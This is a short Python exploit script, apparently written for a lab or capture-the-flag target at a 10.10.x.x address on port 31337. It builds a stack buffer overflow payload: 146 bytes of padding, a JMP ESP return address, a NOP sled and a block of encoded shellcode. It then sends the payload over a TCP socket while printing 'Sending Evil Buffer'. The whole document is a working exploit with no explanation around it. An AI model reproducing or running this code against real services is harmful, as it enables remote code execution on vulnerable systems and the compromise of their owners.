#!/usr/bin/python
import sys,socket, struct
from time import sleep

#bad_chr=\x00\x0a

shellcode =  b""
shellcode += b"\xda\xde\xd9\x74\x24\xf4\x5a\x31\xc9\xbe\x35"
shellcode += b"\xf9\xa1\xda\xb1\x52\x31\x72\x17\x03\x72\x17"
shellcode += b"\x83\xdf\x05\x43\x2f\xe3\x1e\x06\xd0\x1b\xdf"
shellcode += b"\x67\x58\xfe\xee\xa7\x3e\x8b\x41\x18\x34\xd9"
shellcode += b"\x6d\xd3\x18\xc9\xe6\x91\xb4\xfe\x4f\x1f\xe3"
shellcode += b"\x31\x4f\x0c\xd7\x50\xd3\x4f\x04\xb2\xea\x9f"
shellcode += b"\x59\xb3\x2b\xfd\x90\xe1\xe4\x89\x07\x15\x80"
shellcode += b"\xc4\x9b\x9e\xda\xc9\x9b\x43\xaa\xe8\x8a\xd2"
shellcode += b"\xa0\xb2\x0c\xd5\x65\xcf\x04\xcd\x6a\xea\xdf"
shellcode += b"\x66\x58\x80\xe1\xae\x90\x69\x4d\x8f\x1c\x98"
shellcode += b"\x8f\xc8\x9b\x43\xfa\x20\xd8\xfe\xfd\xf7\xa2"
shellcode += b"\x24\x8b\xe3\x05\xae\x2b\xcf\xb4\x63\xad\x84"
shellcode += b"\xbb\xc8\xb9\xc2\xdf\xcf\x6e\x79\xdb\x44\x91"
shellcode += b"\xad\x6d\x1e\xb6\x69\x35\xc4\xd7\x28\x93\xab"
shellcode += b"\xe8\x2a\x7c\x13\x4d\x21\x91\x40\xfc\x68\xfe"
shellcode += b"\xa5\xcd\x92\xfe\xa1\x46\xe1\xcc\x6e\xfd\x6d"
shellcode += b"\x7d\xe6\xdb\x6a\x82\xdd\x9c\xe4\x7d\xde\xdc"
shellcode += b"\x2d\xba\x8a\x8c\x45\x6b\xb3\x46\x95\x94\x66"
shellcode += b"\xc8\xc5\x3a\xd9\xa9\xb5\xfa\x89\x41\xdf\xf4"
shellcode += b"\xf6\x72\xe0\xde\x9e\x19\x1b\x89\xaa\xd6\x68"
shellcode += b"\x18\xc3\xea\x6e\x9b\xa8\x62\x88\xf1\xde\x22"
shellcode += b"\x03\x6e\x46\x6f\xdf\x0f\x87\xa5\x9a\x10\x03"
shellcode += b"\x4a\x5b\xde\xe4\x27\x4f\xb7\x04\x72\x2d\x1e"
shellcode += b"\x1a\xa8\x59\xfc\x89\x37\x99\x8b\xb1\xef\xce"
shellcode += b"\xdc\x04\xe6\x9a\xf0\x3f\x50\xb8\x08\xd9\x9b"
shellcode += b"\x78\xd7\x1a\x25\x81\x9a\x27\x01\x91\x62\xa7"
shellcode += b"\x0d\xc5\x3a\xfe\xdb\xb3\xfc\xa8\xad\x6d\x57"
shellcode += b"\x06\x64\xf9\x2e\x64\xb7\x7f\x2f\xa1\x41\x9f"
shellcode += b"\x9e\x1c\x14\xa0\x2f\xc9\x90\xd9\x4d\x69\x5e"
shellcode += b"\x30\xd6\x99\x15\x18\x7f\x32\xf0\xc9\x3d\x5f"
shellcode += b"\x03\x24\x01\x66\x80\xcc\xfa\x9d\x98\xa5\xff"
shellcode += b"\xda\x1e\x56\x72\x72\xcb\x58\x21\x73\xde"

#0x080414c3
#0x080416bf
jmp_esp=struct.pack("<I", 0x080416bf)
#crash = b"A" * 146 + jmp_esp + b"\x90" * 10 + shellcode + b"\x90" * 20
crash = b"A" * 146 + b"\xbf\x16\x04\x08" + b"\x90" * 10 + shellcode + b"\x90" * 20

payload = crash


try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.10.64.72',31337))
	print("Sending Evil Buffer ... ")
	s.send(payload + b'\n')
	s.close()
except:
	print("\n Couldn't connect...")
	s.close()
